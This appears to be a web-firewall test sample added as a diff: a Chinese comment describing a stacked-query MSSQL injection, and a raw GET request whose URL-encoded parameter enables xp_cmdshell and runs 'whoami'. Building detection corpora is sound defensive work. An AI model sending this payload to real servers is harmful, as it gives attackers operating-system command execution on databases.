@@ -1,0 +1,9 @@
+# SQL注入_GET_mssql_普通注入-06506395
+# 攻击者基于堆叠查询，将"EXEC sp_configure 'show advancedoptions',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;exec sp_configure;exec xp_cmdshell 'whoami'"语句注入到 SQL 查询参数中，执行EXEC sp_configure将xp_cmdshell的值设置为1，进而执行cmd系统命令。
+GET /?id=1%3BEXEC%20sp_configure%20%27show%20advancedoptions%27%2C1%3BRECONFIGURE%3BEXEC%20sp_configure%20%27xp_cmdshell%27%2C1%3BRECONFIGURE%3Bexec%20sp_configure%3Bexec%20xp_cmdshell%20%27whoami%27&bid=hd_tag_m8mv23w1 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23w1
+RM-PRO-Token: 1e896db201b113e39c2a6116efc7037d
+RM-PRO-Time: 1742808348407
+User-Agent: curl/7.83.1
+
